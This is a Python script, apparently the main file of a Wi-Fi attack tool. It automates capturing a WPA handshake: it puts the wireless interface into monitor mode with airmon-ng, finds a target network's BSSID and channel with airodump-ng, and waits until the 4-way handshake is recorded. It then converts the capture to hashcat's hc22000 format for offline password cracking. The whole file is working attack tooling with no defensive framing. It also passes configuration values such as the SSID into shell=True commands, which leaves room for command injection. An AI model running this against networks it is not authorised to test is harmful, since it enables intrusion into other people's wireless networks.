import subprocess
import signal
import json
import time
import sys

from common_functions import get_config_field, write_log

from components.airmon import Airmon
from components.airodump import Airodump
from components.aircrack import Aircrack

from csv_functions import get_required_network_information


SUCCESSFULL_PREFIX = '[+]'
ERROR_PREFIX = '[!]'


def check_config_file():
    try:
        with open('configuration.json') as f:
            configuration_fields = json.load(f)
            mandatory_fields = ['interface']
            abort_program = False
            for field in mandatory_fields:
                if not field in configuration_fields:
                    write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" is uncomplete. Field "{field}" not found')
                    abort_program = True
            if abort_program:
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" does not exists')
        sys.exit(1)
        
        
def check_dependencies():
    dependencies = ['hcxpcapngtool']
    for command in dependencies:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.returncode != 0 and output.returncode != 1:
            write_log(f'[!] Command "{command}" not installed')
            
            
def pcap_to_hashcat_format(file_name: str):
    command = f'hcxpcapngtool -o psk.hc22000 {file_name}-01.cap'
    run = subprocess.run(command, shell=True, capture_output=True, text=True)
    if run.stderr:
        write_log(f'[!] Failed in command "{command}"')
    else:
        write_log(f'[+] .cap file exported correctly to hashcat format')


if __name__ == '__main__':
    # Check if configuration file exists and it has every mandatory key
    check_config_file()
    
    # Check if every command it is installed
    check_dependencies()
    
    # Setting interface in monitor mode
    interface = get_config_field('interface')

    airmon: Airmon = Airmon()
    airmon.check(kill=True)
    monitor_interface: str = airmon.start(interface)

    # Capturing packets with airodump-ng
    airodump: Airodump = Airodump()

    # Exporting csv file to get all networks
    output_file_name = 'networks'
    args = ['--output-format csv', f'-w {output_file_name}']
    airodump.exec(monitor_interface, args)

    # Once airodump has stored all networks, I get the network bssid and its channel
    network_ssid = get_config_field('ssid')
    bssid, channel = get_required_network_information(output_file_name, network_ssid)
    if not bssid or not channel:
        write_log(f'[!] Network with SSID {network_ssid} not found')
        
    # Get 4-way-handshake
    handshake_file_name = f'{network_ssid}-psk'
    args = [f'-c {channel}', f'--bssid {bssid}', f'-w {handshake_file_name}', '--output-format pcap']
    shell_command = airodump.get_str_shell_command(monitor_interface, args)
    
    # Execute airodump-ng as subprocess
    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    aircrack: Aircrack = Aircrack()
    
    found_handshake = False
    while not found_handshake:
        found_handshake = aircrack.check_captured_handshake(handshake_file_name)
        time.sleep(15)
        
    process.terminate()
    try:
        process.wait(10)
    except Exception:
        process.kill()
        
    write_log(f'[+] Handshake captured')
    
    # Transform .cap file to hashcat format with hcxpcappngtool
    pcap_to_hashcat_format(handshake_file_name)